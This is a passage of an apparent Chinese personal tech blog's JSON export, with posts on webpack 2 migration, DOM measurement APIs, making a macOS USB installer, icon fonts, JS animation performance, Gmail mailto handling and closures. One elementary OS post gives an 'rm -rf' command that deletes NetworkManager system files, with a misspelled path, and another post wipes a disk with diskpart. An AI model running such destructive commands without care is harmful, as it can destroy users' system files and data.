breaking changes ，想着反正这些问题迟早要解决的，于是就开始了我的 webpack 2 踩坑过程","text":"最近上手新项目的时候想要用个 sass，结果发现 npm 里面的 sass-loader 默认的 peerDependencies 中的 webpack 版本被升级到了 2当时没想太多，就装了个 webpack 2.2.1 来用，结果发现以前项目的 webpack 配置居然不能够直接用！一跑起来一还堆错上网查了下，才知道 webpack 2 弄了很多 breaking changes ，想着反正这些问题迟早要解决的，于是就开始了我的 webpack 2 踩坑过程 1、以前那种省略 ‘-loader’ 的写法不能直接用了具体信息参考 https://github.com/webpack/webpack/releases/tag/v2.1.0-beta.26如果还是要用以前的这种省略式的写法，需要在 webpack 的配置文件中添加一条配置项1resolveLoader: &#123;moduleExtensions : [&apos;-loader&apos;]&#125; 2、相关插件都要对应的进行升级webpack 2 和旧版本的 extract-text-webpack-plugin 似乎不兼容如果要 extract-text-webpack-plugin，则 extract-text-webpack-plugin 的版本也要升到 2.0 以上截至写这篇文章为止，extract-text-webpack-plugin 的最新版本是 2.0.0-rc.3，可以直接复制下面的命令安装1npm install extract-text-webpack-plugin@2.0.0-rc.3 --save-dev 注：如果安装了旧版本的 extract-text-webpack-plugin，需要先卸载旧版，再安装新版webpack-dev-server 也是一样，需要安装 2.0 或更高版本：1npm install webpack-dev-server@latest --save-dev 3、extract-text-webpack-plugin 中 extract 方法的参数需要修改比如之前需要合成 sass 的话，直接这样配置就可以了12test: /\\.scss/,loader: ExtractTextPlugin.extract('style-loader', 'css-loader','sass-loader') 当时的参数形式是这样的：1ExtractTextPlugin.extract([notExtractLoader], loader, [options]) 接着换成新的参数形式是这样的：1ExtractTextPlugin.extract(&#123;[fallback], use, [publicPath]&#125;) 其中参数形式变成了对象，不再是原来那样直接传字符串，接着 notExtractLoader 改了个名字叫 fallback（之前还叫过 fallbackLoader），loader 改名成了 use所以上面那个例子转换过来之后的形式是这个样子的：12345test: /\\.scss/,loader: ExtractTextPlugin.extract(&#123; fallback: \"style-loader\", use: [\"css-loader\", \"sass-loader\"]&#125;) 还好我这边的配置不是很多，所以改动量就只有这么大不过理解起来还是稍微废了点劲，写出来之后就明白多了 参考资料： Webpack 1 ReadMeWebpack 2 ReadMeMigrating from v1 to v2Migrating to Webpack 2","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"webpack","slug":"webpack","permalink":"https://hexo.bangz.me/tags/webpack/"}]},{"title":"原生 js 中的各种宽高以及位置的获取","slug":"357","date":"2016-11-06T22:44:00.000Z","updated":"2018-06-08T10:26:51.000Z","comments":true,"path":"archives/getting-size-and-position-attributes-with-javascript.html","link":"","permalink":"https://hexo.bangz.me/archives/getting-size-and-position-attributes-with-javascript.html","excerpt":"最近在用原生的 js 来实现一些交互特效，写的时候发现这些宽度和高度的获取真的是太常用了而且获取他们的方法不止一个两个，上网一搜发现有好多，看得我眼花缭乱的于是我自己做了一个归纳，方便以后快速查阅 对于移动端，一般要统一初始化视口宽高缩放比例","text":"最近在用原生的 js 来实现一些交互特效，写的时候发现这些宽度和高度的获取真的是太常用了而且获取他们的方法不止一个两个，上网一搜发现有好多，看得我眼花缭乱的于是我自己做了一个归纳，方便以后快速查阅 对于移动端，一般要统一初始化视口宽高缩放比例 1&lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\"/&gt; ### ## 一、全局类的宽高获取：屏幕分辨率宽度和高度的获取： 宽度：window.screen.width 高度：window.screen.height 屏幕可用工作区宽度和高度的获取： 宽度：window.screen.availWidth 高度：window.screen.availHeight 浏览器应用程序窗口宽度和高度的获取（整个浏览器程序）： 宽度：window.outerWidth 高度：window.outerHeight 浏览器视口宽度和高度的获取（包括滚动条）： 宽度：window.innerWidth 高度：window.innerHeight 浏览器视口宽度和高度的获取（不包括滚动条）： 宽度：document.documentElement.clientWidth 高度：document.documentElement.clientHeight 文档实际内容宽度和高度的获取： 宽度：document.body.clientWidth 高度：document.body.clientHeight 二、DOM 元素宽度和高度的获取对于每个 DOM 元素，均有 6 个获取它们的宽高的方法 offsetWidth, offsetHeight: 分别负责获取 DOM 元素的宽度和高度，包括所有 border 和 padding clientWidth, clientHeight: 分别负责获取 DOM 元素的宽度和高度，不包括 border 和滚动条，但包括 padding scrollWidth, scrollHeight: 分别负责获取 DOM 元素的宽度和高度，如果有滚动条的话，会包括那些暂时在滚动区外不可见的内容。 具体情况如下图： 三、DOM 元素位置的获取： offsetTop, offsetLeft：分别负责获取元素相对于父元素的上偏移和左偏移 scrollTop, scrollLeft：分别负责获取元素相对于父元素的上滚动距离和左滚动距离 clientTop, clientLeft：分别负责获取元素的上、左两个 border 的厚度（这个其实不是获取元素位置的，之所以摆出来，是因为它容易跟前面两个混淆） 具体情况如下图： 下面还有一张更加清晰的图： 四、通过 getBoundingClientRect 获取元素位置和大小除了以上两种方法，目前在 js 中还有另一种方法也可以比较好的获取 DOM 元素的位置和大小，就是通过 getBoundingClientRect 方法来获取该方法会返回一个 DOMRect 对象1var rect = dom.getBoundingClientRect(); 然后通过该对象，可以获得以下属性： rect.width 元素宽度 rect.height 元素高度 rect.left 元素左边相对于视口原点的横向 X 轴距离 rect.right 元素右边相对于视口原点的横向 X 轴距离 rect.top 元素顶部相对于视口原点的纵向 Y 轴距离 rect.bottom 元素底部相对于视口原点的纵向 Y 轴距离 具体情况如下图： 五、浏览器当前滚动位置的获取： window.pageXoffset：获取当前浏览器横向滚动条的位置 window.pageYoffset：获取当前浏览器纵向滚动条的位置 window.scrollX：同 pageXoffset，是 pageXoffset 的别名 window.scrollY：同 pageYoffset，是 pageYoffset 的别名 注：在 IE9 以前，不支持该方法，适用于 IE8 及更早版本的 IE 浏览器的方法如下： document.documentElement.scrollTop：获取当前浏览器垂直滚动条的位置 document.documentElement.scrollLeft：获取当前浏览器水平滚动条的位置 六、鼠标位置的获取： offsetX, offsetY：获取鼠标当前位置相对于当前焦点元素的横向 X 轴距离和纵向 Y 轴距离 clientX, clientY：获取鼠标当前位置相对于浏览器视口原点的横向 X 轴距离和纵向 Y 轴距离 pageX, pageY：获取鼠标当前位置相对于浏览器页面文档流原点的横向 X 轴距离和纵向 Y 轴距离 screenX, screenY：获取鼠标当前位置相对于屏幕原点的横向 X 轴距离和纵向 Y 轴距离 具体情况如下图： 下面这张图更好的阐释了 pageX 和 pageY：","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"}]},{"title":"在 windows 下制作 macOS Sierra（10.12）正式版的安装 U 盘","slug":"349","date":"2016-11-01T01:07:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/create-a-mac-bootable-sierra-image-usb-stick-from-windows.html","link":"","permalink":"https://hexo.bangz.me/archives/create-a-mac-bootable-sierra-image-usb-stick-from-windows.html","excerpt":"最近咱老大丢给我了一台 Mac mini，准备给我用来做前端用。 说实话，要不是咱老大拿出了这台 Mac mini ，我还不知道苹果有这么一条产品线呢。 mini 应该算是整个苹果 PC 产品线上，用来给 mac 新手上路的成本最低的方案了。 而且作为一个台式机来说，确实够小巧精致，面积才一个小鼠标垫那么大，高度大概也只有一个键盘那么高。 拿起来其实感觉还没有 Macbook Air 重，可以能像笔记本一样能够便携，咱只要花上 air 一半的价钱就能够用上 macOS 个人感觉这对 mac 新人来说还是挺划算的。于是马上接好了线，开机，发现系统版本还是 Yosemite，还装了一堆我用不到的东西。 作为一个爱干净前端，看到这一堆乱七八糟的东西之后强迫症开始犯了，于是开始想办法，把系统给干了，重新装一遍。 由于是新手，不能够像重装 windows 一样那么熟练地重装 mac，倒腾了几天，终于找到了一个可行的 U 盘安装方法。","text":"最近咱老大丢给我了一台 Mac mini，准备给我用来做前端用。 说实话，要不是咱老大拿出了这台 Mac mini ，我还不知道苹果有这么一条产品线呢。 mini 应该算是整个苹果 PC 产品线上，用来给 mac 新手上路的成本最低的方案了。 而且作为一个台式机来说，确实够小巧精致，面积才一个小鼠标垫那么大，高度大概也只有一个键盘那么高。 拿起来其实感觉还没有 Macbook Air 重，可以能像笔记本一样能够便携，咱只要花上 air 一半的价钱就能够用上 macOS 个人感觉这对 mac 新人来说还是挺划算的。于是马上接好了线，开机，发现系统版本还是 Yosemite，还装了一堆我用不到的东西。 作为一个爱干净前端，看到这一堆乱七八糟的东西之后强迫症开始犯了，于是开始想办法，把系统给干了，重新装一遍。 由于是新手，不能够像重装 windows 一样那么熟练地重装 mac，倒腾了几天，终于找到了一个可行的 U 盘安装方法。好了，开始正题，先声明一下，以下方法仅在 Mac mini 2014 版上能够生效，其他设备的情况暂时还不知道 第一步：准备一个 8G 以上的 U 盘 由于需要进行格式化，所以请提前对 U 盘内的内容进行备份 第二步：下载 macOS sierra 的安装盘镜像这里给多几个地址，目前来说，本人是只有第一个地址能用，但是看到网上有的文章说另外两个地址的镜像能用不过他们的教程都是用 mac 进行演示的，所以保险起见，我这里把几个镜像的地址都贴出来吧（这些地址可能需要梯子才能下载） 地址一：macOS Sierra 10.12 bootable USB for Intel PCs 地址二：macOS Sierra 10.12 (16A323) 地址三：macOS Sierra 10.12 (16A323) bootable USB (DMG File) 百度网盘地址：Sierra 镜像种子 第三步：使用 diskpart 格式化 U 盘并转换分区格式mac 系统版对 U 盘的要求其实还挺苛刻的，必须是 GPT 格式的分区才能够被识别 所以这里借助 windows 下自带的 diskpart 来将分区转换为 GPT 格式 老规矩，用管理员权限运行 cmd（win7 下默认是管理员权限） 开始 -&gt;运行 -&gt;输入 cmd-&gt;回车 如果是 win8 以上系统，请自行百度如何以管理员模式启动命令提示符（印象中是 win+x 组合键） 整套操作如图所示，在命令提示符中输入 diskpart ，进入 diskpart 分区管理工具 用 list disk 找到自己的 U 盘对应的磁盘号，比如说我的 U 盘的盘号是 1 那么就接着用 select disk 1 选中自己的 U 盘 执行 clean 清除掉磁盘上的所有数据，包括分区配置信息 执行完 clean 之后就可以将 U 盘转换成 GPT 格式了，输入 convert GPT 转换完成后，再将分区表重新创建回来，执行 create partition primary 这样子 U 盘的格式转换就算完成了，直接关掉命令提示符即可 第四步：将镜像刻入 U 盘这里需要 win32diskImager，可以去 这里 下载一个，也可以从 备用地址 下载一个 装好之后启动 Win32DiskImager，将解压出来的 raw 镜像文件选择进去 查看的文件类型那里记得改一下，改为 .，不然可能无法看到. raw 格式的文件 最后选择好自己的 U 盘所在的盘符（这里千万别选错了，不然后果很严重！），点击 Write，将镜像写入 U 盘 当镜像成功刻入了 U 盘之后，启动盘就算做好了。 插到 Mac Mini 上，按住 Options 键开机，直到出现 Install macOS Sierra，选择进去安装即可","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://hexo.bangz.me/tags/Mac/"},{"name":"Sierra","slug":"Sierra","permalink":"https://hexo.bangz.me/tags/Sierra/"},{"name":"系统安装","slug":"系统安装","permalink":"https://hexo.bangz.me/tags/系统安装/"},{"name":"U盘镜像","slug":"U盘镜像","permalink":"https://hexo.bangz.me/tags/U盘镜像/"},{"name":"windows","slug":"windows","permalink":"https://hexo.bangz.me/tags/windows/"}]},{"title":"使用阿里巴巴矢量图标库自定义图标集","slug":"345","date":"2016-10-25T01:44:00.000Z","updated":"2018-06-08T09:48:44.000Z","comments":true,"path":"archives/customize-icon-font-for-your-own-website.html","link":"","permalink":"https://hexo.bangz.me/archives/customize-icon-font-for-your-own-website.html","excerpt":"最近用上了阿里巴巴的矢量图标库后，简直爱不释手，对小网站来说真是太好用了。有的时候，对于自己开发的小型网站来说，不太想用 bootstrap 这么重的框架，但又想用 bootstrap 里面的字体图标一般我的做法就是直接手动引入 font-awesome，然后在对应要用到图标的地方加 class但从现在看来，直接引用 font-awesome 还是有这么一些个很明显的缺陷：","text":"最近用上了阿里巴巴的矢量图标库后，简直爱不释手，对小网站来说真是太好用了。有的时候，对于自己开发的小型网站来说，不太想用 bootstrap 这么重的框架，但又想用 bootstrap 里面的字体图标一般我的做法就是直接手动引入 font-awesome，然后在对应要用到图标的地方加 class但从现在看来，直接引用 font-awesome 还是有这么一些个很明显的缺陷： font-awesome 的图标集比较大，整个图标集有几百个图标，但我实际用到的图标可能只有不到十个 要找到自己想要的图标，必须得去官网查表一个一个的找，有的时候不确定自己想要的图标的英文单词是哪个，就只能一个一个的去看，比如说人民币到底是叫 fa-yuan 还是 fa-rmb。又比如要找学校，到底是找 fa-school 还是 fa-university。这些不确定性导致了我找图标是一个很难受的过程。 有的时候自己想要的图标找不到，比如说我想找描述股票的图标 stock，font-awesome 里面没有，只能去找类似的顶一顶了。 针对这些问题，阿里弄出了个定制的矢量图标库，完美地解决了以上的全部问题。这个库里面已经积累了数十万的图标，可以就像购物一样的上去把自己需要的图标放入暂存架（购物车），然后将暂存架中的图标生成字体图标集（下单），然后下载下来（发货），这样子就能实现定制图标字体了，这对于小网站来说简直就是福音，因为小网站一般用到的图标不会太多。既然这个库这么好用，今天就来说一下这个库要怎么用吧，记录一下它的使用方法。直接进 阿里巴巴矢量图标库 然后搜索自己需要的图标，看到心仪的图标后点一下放进暂存架，我这里随手挑了 3 个 挑完之后点击 “下载到本地” 保存到本地电脑上，然后解压出来 点进解压的文件夹，可以看到刚才挑选的图标已经被打包成了对应的各种字体文件 打开 demo.html，可以看到里面显示出了对应的字体 现在咱们想要让这个字体图标能够像 font-awesome 那样使用 &lt; i class=”icon icon”&gt; 来显示图标，那么只需要在项目的 css 文件里面这样配置：1234567@font-face &#123;font-family: 'iconfont'; src: url('iconfont.eot'); /* IE9*/ src: url('iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */ url('iconfont.woff') format('woff'), /* chrome、firefox */ url('iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/ url('iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */&#125; 然后设定字体类123456789.icon &#123; font: normal normal normal 14px/1 \"iconfont\"; font-size: inherit; display: inline-block; text-align: center; -webkit-font-smoothing: antialiased; -webkit-text-stroke-width: 0.2px; -moz-osx-font-smoothing: grayscale;&#125; 再配置好对应的图标类，在这里我们以人民币符号为例，可以看到人民币符号对应的 HTML 转义序列是 &amp;#xe6e0，其实就是 16 进制的 e6e0 的意思写到 CSS 里面对应的写法如下：123.icon-yuan:before &#123; content: \"\\e6e0\";&#125; 这样子写好 CSS 以后就能够直接在 HTML 里面引用了1&lt;span&gt;&lt;i class=\"icon icon-yuan\"&gt;&lt;/i&gt; 人民币 < span class=\"tag\">&lt;/span&gt; 效果如下： 这样子就实现了像 font-awesome 一样使用自己定制的字体图标集啦","categories":[{"name":"实用工具","slug":"实用工具","permalink":"https://hexo.bangz.me/categories/实用工具/"}],"tags":[{"name":"iconfont","slug":"iconfont","permalink":"https://hexo.bangz.me/tags/iconfont/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"字体图标","slug":"字体图标","permalink":"https://hexo.bangz.me/tags/字体图标/"}]},{"title":"禁用 Elementary OS 下的开机弹框","slug":"330","date":"2016-10-22T23:07:00.000Z","updated":"2018-06-08T09:48:18.000Z","comments":true,"path":"archives/elementary-os-disable-login-window.html","link":"","permalink":"https://hexo.bangz.me/archives/elementary-os-disable-login-window.html","excerpt":"机子上了 elementary OS 之后，最近发现这个开机弹官网下载框问题越来越严重了以前 eOS 官网还没有被 wall 的时候，这个框还没什么大问题，直接关掉就行了但是现在 eOS 官网不能直接打开了，这个框就直接卡死在那，标题上写着 log in，直接关根本关不掉更糟糕的是，它还强制显示在所有窗口的最上层，挡住视线，由于卡死在那又移不开，所以每次开机都得用 kill 命令把它干掉了这么搞，每次都要 kill，实在是相当麻烦，于是最近找了找办法。发现直接禁用掉就可以了 在 freya 的 terminal 里面直接执行这一条命令：","text":"机子上了 elementary OS 之后，最近发现这个开机弹官网下载框问题越来越严重了以前 eOS 官网还没有被 wall 的时候，这个框还没什么大问题，直接关掉就行了但是现在 eOS 官网不能直接打开了，这个框就直接卡死在那，标题上写着 log in，直接关根本关不掉更糟糕的是，它还强制显示在所有窗口的最上层，挡住视线，由于卡死在那又移不开，所以每次开机都得用 kill 命令把它干掉了这么搞，每次都要 kill，实在是相当麻烦，于是最近找了找办法。发现直接禁用掉就可以了 在 freya 的 terminal 里面直接执行这一条命令： 1sudo chmod -x /etc/NetworkManager/dispatcher.d/90captive_portal_test 没错，就是回收 90captive_portal_test 这个文件的执行权限，这样子开机就不会再出现这个烦人的弹框了 当然，这不是唯一的方法，你也可以用 How to stop captive-long in Elementary OS Freya? 中提到的方法，直接把 captive-login 这个文件给替换掉 或者参照国内文章里面提到的方法，直接删掉对应的文件123cd /usr/bin/ sudo mv captive-login captive-login.bakrm -rf /etc/NetworkManager/dispacher.d/90-capti* 对于这个问题，实际上在 eOS 官网已经有人提了类似的 bug：https://bugs.dogfood.paddev.net/capnet-assist/+bug/1039042","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"Elementary OS","slug":"Elementary-OS","permalink":"https://hexo.bangz.me/tags/Elementary-OS/"},{"name":"eOS","slug":"eOS","permalink":"https://hexo.bangz.me/tags/eOS/"}]},{"title":"js 实时动画性能优化初体验","slug":"299","date":"2016-09-22T18:04:00.000Z","updated":"2018-06-08T09:47:29.000Z","comments":true,"path":"archives/first-experience-improve-render-efficiency.html","link":"","permalink":"https://hexo.bangz.me/archives/first-experience-improve-render-efficiency.html","excerpt":"最近研究了一下页面性能优化这一块，参照着 这篇文章 来实际动手做了一下原文说的非常好，一路做下来确实很有成就感，页面的性能得到了非常大的提升，实时渲染帧率从原来十几帧提高到了接近 60 帧。先嗮一下成果：","text":"最近研究了一下页面性能优化这一块，参照着 这篇文章 来实际动手做了一下原文说的非常好，一路做下来确实很有成就感，页面的性能得到了非常大的提升，实时渲染帧率从原来十几帧提高到了接近 60 帧。先嗮一下成果： 根据上图的结果来看，能够优化到这个程度确实算很不错了，但是在实际做的过程中，还是发现了许多问题下面就说一下我在实际写的过程中的一些记录 一、新版 Chrome 里面 FPS 计数器的打开方法文中说 FPS 计数器是自带的，于是我就去谷歌了下怎么打开，结果搜出来的都是老版 Chrome 的打开方法，当时的 FPS Meter 还在实验测试期呢，还要从 chrome://flags 里面去找。我找了找没找到，还以为没有这个功能了呢。后来仔细一找，才发现这个功能已经可以在控制台里面找到了。下面说下新版 Chrome 里面打开 FPS 计数器的方法F12 打开控制台 -&gt; DevTools -&gt; More Tools -&gt; Rendering settings 然后在打开的面板上面勾上 FPS Meter 即可看到 FPS 计数器出来了 二、关于 requestAnimationFrame 这个函数对于这个函数，个人感觉有点不稳定，时好时坏，之前在公司的电脑上试的时候，倒是出现了卡帧的现象，弄得我还以为这个函数不能用呢，过了几天再来试了试，居然又没问题了。。。总的来说感觉这个函数我在家里的电脑上试的时候，跟 setInterval 条件下的帧率进行比较，发现并没有太大区别，可能是现在的浏览器的渲染性能越来越强的缘故吧。不知道这个 API 在移动端上的表现怎样，感觉可能会出现兼容性问题。在 PC 上跟 setInterval 的比较情况如下：使用 setInterval： 使用 requestAnimationFrame： 要说二者的最大区别，应该就是实现方式了吧。通过上面的结果，不难发现，requestAnimationFrame 用的是递归式的调用，JS Heap 一直在上升，然后上升到一定程度之后就被 Chrome 的垃圾清理给释放掉了，如此反复。而 setInterval 的 JS Heap 曲线基本上保持稳定不变，因为它是是非递归式的，这样来看似乎 setInterval 比 requestAnimationFrame 更有优势一些，不过个人感觉其实差别真的不大，爱用哪个用哪个吧。 注：这个 API 已经被写入了 HTML5.1 标准HTML 5.1-Web application APIs:Animation Frames 三、移除 jquery，改用原生 DOM 操作随着 jquery 越来越庞大，越来越多的人开始诟病 jquery 的大小和性能问题，尤其是在这种以实时渲染为基础的应用中，使用 jquery 来进行 dom 操作也是影响帧率的重要因素，经过实际动手操作后，发现确实若不使用 jquery，dom 操作的时间会大幅缩短下面这张是去掉 jquery 之前的情况： 对比一下下面这张去掉了 jquery 之后的情况： 可以看到，Scripting 脚本计算的时间大大缩短，取而代之的是 Rendering 渲染频率的提高，还是比较明显的能够发现去掉 jquery 能够带来的性能提升 四、使用 createDocumentFragment 拼接元素使用这个方法的好处有不少，下面我就来随便列几点： 它能够比 jquery 更快地构造 DOM 树 能够实现在 for 循环构造完成 DOM 树以后再进行一次性的 append，减少反复 DOM 操作浪费的时间 去掉在 js 中的 html 代码，将视图构造转换为业务逻辑 当需要修改里面的小圆的位置时，可以直接从 js 中调出对应的 Element 进行修改，不需要再进行一次 DOM 查询操作 这是改良以后的实现：123456789101112131415161718192021var object = [];var mainContainer = document.getElementsByClassName(\"main\")[0];var docFrag = document.createDocumentFragment();for (var i = 0; i &lt; COUNT; i++) &#123; var d = Math.random() * 2 * Math.PI; var v = Math.random() * 5; var circle = document.createElement(\"div\"); circle.id = \"circle-\" + i; circle.className = 'circle'; docFrag.appendChild(circle); var vx = v * Math.cos(d); var vy = v * Math.sin(d); object.push(&#123; x: 250, y: 250, vx: vx, vy: vy, dom: circle &#125;);&#125;mainContainer.appendChild(docFrag); 当需要修改小圆的位置时，进需要从 object 数组中取出对应的小圆进行修改即可12345678910111213141516171819202122for (var i = 0; i &lt; COUNT; i++) &#123; var x = object[i].x; var y = object[i].y; var vx = object[i].vx; var vy = object[i].vy; var v = Math.sqrt(vx * vx + vy * vy); if (Math.abs(vx) &lt; 1e-9) &#123; vx = 0; &#125; vx += F * vx / v; vy += F * vy / v + G; x += vx; y += vy; object[i].x = x; object[i].y = y; object[i].vx = vx; object[i].vy = vy; object[i].dom.style.transform = 'translate(' + x + 'px,' + (400 - y) + 'px)';&#125; 最后附上优化好了之后的代码：js 性能优化初体验——代码 参考资料：使用 Chrome Timeline 来优化页面性能使用 Chrome DevTools 的 Timeline 分析页面性能网页性能管理详解：浅谈 chrome-Timeline 及 window.requestAnimationFrame()方法","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[]},{"title":"设置 Chrome 使用 Gmail 来处理邮件连接","slug":"291","date":"2016-07-18T18:44:00.000Z","updated":"2018-06-08T09:46:02.000Z","comments":true,"path":"archives/set-gmail-as-default-email-handler-in-chrome.html","link":"","permalink":"https://hexo.bangz.me/archives/set-gmail-as-default-email-handler-in-chrome.html","excerpt":"现在在各种网站上还是能经常看到 mailto 这个东西，比如1&lt;a href=\"mailto:i@bangz.me\" target=\"_blank\"&gt;i@bangz.me&lt;/a&gt; 测试邮件链接但是在使用 Chrome 的时候默认点击这些 mailto 链接却没有任何反应现在已经不是 Outlook 的那个时代了，桌面邮件工具已经不再盛行如今许多人都是直接使用在线的邮箱软件，比如 Gmail、Foxmail 等等经过研究，发现 Chrome 是可以实现将 mailto 链接用 Gmail 来接管的 具体的实现步骤如下","text":"现在在各种网站上还是能经常看到 mailto 这个东西，比如1&lt;a href=\"mailto:i@bangz.me\" target=\"_blank\"&gt;i@bangz.me&lt;/a&gt; 测试邮件链接但是在使用 Chrome 的时候默认点击这些 mailto 链接却没有任何反应现在已经不是 Outlook 的那个时代了，桌面邮件工具已经不再盛行如今许多人都是直接使用在线的邮箱软件，比如 Gmail、Foxmail 等等经过研究，发现 Chrome 是可以实现将 mailto 链接用 Gmail 来接管的 具体的实现步骤如下 1、进入 Chrome 的协议处理程序：菜单 -&gt; 设置 -&gt; 显示高级设置 -&gt; 隐私设置 -&gt; 内容设置 -&gt; 处理程序 -&gt; 管理处理程序也可以直接在 Chrome 的地址栏输入 chrome://settings/handlers 看一下有没有 mailto 这个选项，有的话可以直接设置到 gmail 不过现在 Chrome 一般默认没有这个选项，所以我们只能通过别的办法来解决 2、打开你的 Gmail 页面，登录进去 3、把下面的代码复制到地址栏，并回车1javascript:navigator.registerProtocolHandler(&quot;mailto&quot;,&quot;https://mail.google.com/mail/?extsrc=mailto&amp;url=%s&quot;,&quot;Gmail&quot;) 需要注意的是，现在直接复制上面的东西到地址栏的话，前面的 javascript: 可能会被自动消掉这时候必须手动补上 javascript:接着会弹出下面的对话框，选择允许即可 4、回到 Chrome 的设置页，应该可以看到 gmail 被加上去了可以直接在地址栏输入 mailto: 然后回车 可以跳转到 gmail 则说明设置成功 参考资料 Getting Gmail to handle all mailto: links with registerProtocolHandler 让 Chrome 接管邮件连接，收发邮件更方便了","categories":[{"name":"实用工具","slug":"实用工具","permalink":"https://hexo.bangz.me/categories/实用工具/"}],"tags":[]},{"title":"javascript 中闭包的概念与用法","slug":"283","date":"2016-07-17T20:51:00.000Z","updated":"2018-06-08T09:44:40.000Z","comments":true,"path":"archives/using-javascript-closure.html","link":"","permalink":"https://hexo.bangz.me/archives/using-javascript-closure.html","excerpt":"今天咱们来讨论一下 javascript 的这个闭包机制吧曾经 javascript 的这个闭包的问题困惑了我很久很久看网上那些说法看了半天都是懵的，看了书更加看不懂过了好一段时间，在我巩固完一些基础知识之后现在再回来看这个闭包机制，总算搞懂一些了 首先要弄明白闭包机制，必须对作用域这个东西非常熟悉JavaScript 中，变量的局部作用域是函数级别的。","text":"今天咱们来讨论一下 javascript 的这个闭包机制吧曾经 javascript 的这个闭包的问题困惑了我很久很久看网上那些说法看了半天都是懵的，看了书更加看不懂过了好一段时间，在我巩固完一些基础知识之后现在再回来看这个闭包机制，总算搞懂一些了 首先要弄明白闭包机制，必须对作用域这个东西非常熟悉JavaScript 中，变量的局部作用域是函数级别的。 也就是说，每一个函数都对应一个作用域，每一个 function() { 后面都是一个新的子域这没有什么好说的，只是值得一提的是，要能够区分函数级作用域和块级作用域的区别比如在 C、C++、Java 这些语言中，它的局部作用就是块级别的，一对花括号就对应一个子域123456789101112131415161718192021222324public class Demo&#123; public static String name = \"微学苑\"; // 类级变量 public int i; // 对象实例级变量 // 属性块，在类初始化属性时候运行 &#123; int j = 2;// 块级变量 &#125; public void test1() &#123; int j = 3; // 方法级变量 if(j == 3) &#123; int k = 5; // 块级变量 &#125; // 这里不能访问块级变量，块级变量只能在块内部访问 System.out.println(\"name=\" + name + \", i=\" + i + \", j=\" + j); &#125; public static void main(String[] args) &#123; // 不创建对象，直接通过类名访问类级变量 System.out.println(Demo.name); // 创建对象并访问它的方法 Demo t = new Demo(); t.test1(); &#125;&#125; 而在 javascript 中，它则是函数级别的，下面这个例子可以明确的区分出来123456789101112function rainman()&#123; // rainman 函数体内存在三个局部变量 i j k var i = 0; if ( 1 ) &#123; var j = 0; for(var k = 0; k &lt; 3; k++) &#123; alert( k ); // 分别弹出 0 1 2 &#125; alert( k ); // 弹出 3 &#125; alert( j ); // 弹出 0&#125; 这里拓展一下，其实为什么会这样子呢？事实上， javascript 里面有一个机制，就是会把所有的变量声明给前置也就是说，javascript 在执行脚本的时候，会把函数中所有的变量声明放到函数的最前面这样子的话，自然而然的就能理解 javascript 不存在块级作用域的问题了 明白了 js 的作用域之后，接下来才能进入我们要讨论的正题，闭包下面丢一个例子12345678910111213function f(x) &#123; var temp = x; return function(x) &#123; temp += x; console.log(temp); &#125;&#125;var a = f(50);//console.log((a);a(5);a(10);a(20); 运行上面的例子，可以看到输出的结果是 55 , 65，85也就是说，当 f(50) 这一句给运行完了以后，javascript 的回收机制没有去销毁函数 f(x) 中的 temp 变量所以总结一下，对于上面这个 f(x) 函数，他有以下一些特点 它的返回值是一个函数 它的返回值函数中调用了其上一级作用域的变量 它的 temp 变量因为被其子函数给引用，所以不会被销毁 函数外部无法直接访问 temp ，却能在外部通过调用其子函数来修改 temp 的值 根据以上的特点，可以不难发现闭包可以实现一些封装的特性，所以现在的闭包可以用于面向对象的一些封装对于使用闭包，还有以下几点需要注意一下 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在 IE 中可能导致内存泄露。解决方法是，在退出函数之前，将不使用的局部变量全部删除。 闭包会在父函数外部，改变父函数内部变量的值。所以，如果你把父函数当作对象（object）使用，把闭包当作它的公用方法（Public Method），把内部变量当作它的私有属性（private value），这时一定要小心，不要随便改变父函数内部变量的值。 参考资料： 《作用域与闭包：this，var，(function () {})》学习 Javascript 闭包（Closure）闭包 - JavaScript | MDN详解 js 闭包 - SegmentFaultJavaScript 闭包 - 腾讯 Web 前端 IMWeb 团队社区深入理解 JavaScript 的变量作用域Java 变量的作用域_微学苑","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[]},{"title":"解决浮动脱档问题（clearfix）的常用方法","slug":"279","date":"2016-07-16T19:18:00.000Z","updated":"2018-06-08T09:54:56.000Z","comments":true,"path":"archives/make-container-contains-floating-items.html","link":"","permalink":"https://hexo.bangz.me/archives/make-container-contains-floating-items.html","excerpt":"好久没有写过技术文章了，最近回顾起以前的老知识，感觉都忘掉好多了这回来记录一下一个凡是做网页就一定会遇到的问题吧平时做网页处理排版的时候，经常会使用到 css 的浮动功能但是浮动一直以来都有一个很麻烦的问题，就是元素一旦浮动就会脱离文档流这是它的缺点，也是它的优点，为什么这么说呢？它的缺点就缺在于在排版时会增加排版的难度有时候需要父元素始终包裹住子元素，但是 float 脱离文档流之后父元素就不能直接包裹住子元素了就像这样","text":"好久没有写过技术文章了，最近回顾起以前的老知识，感觉都忘掉好多了这回来记录一下一个凡是做网页就一定会遇到的问题吧平时做网页处理排版的时候，经常会使用到 css 